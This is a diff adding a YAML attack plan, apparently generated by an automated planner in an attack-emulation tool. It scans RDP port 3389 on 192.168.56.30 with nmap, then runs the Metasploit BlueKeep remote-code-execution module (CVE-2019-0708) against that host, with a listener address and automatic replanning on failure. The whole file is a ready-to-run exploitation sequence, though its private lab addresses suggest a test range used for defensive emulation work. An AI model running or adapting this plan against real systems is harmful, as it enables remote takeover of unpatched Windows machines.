@@ -1,0 +1,21 @@
+metadata:
+  generated_at: '2026-04-13T13:46:32.422185+00:00'
+  planner: astar
+  total_steps: 2
+steps:
+- name: Reconnaissance on 192.168.56.30
+  type: shell
+  command: nmap -sV -p 3389 192.168.56.30
+  delay_before: 2.11
+  delay_after: 0.29
+  log_output: true
+- name: Exploit CVE-2019-0708 on 192.168.56.30
+  type: metasploit
+  module: exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+  options:
+    RHOSTS: 192.168.56.30
+    LHOST: 192.168.56.10
+  delay_before: 4.66
+  delay_after: 1.64
+  log_output: true
+  on_failure: replan
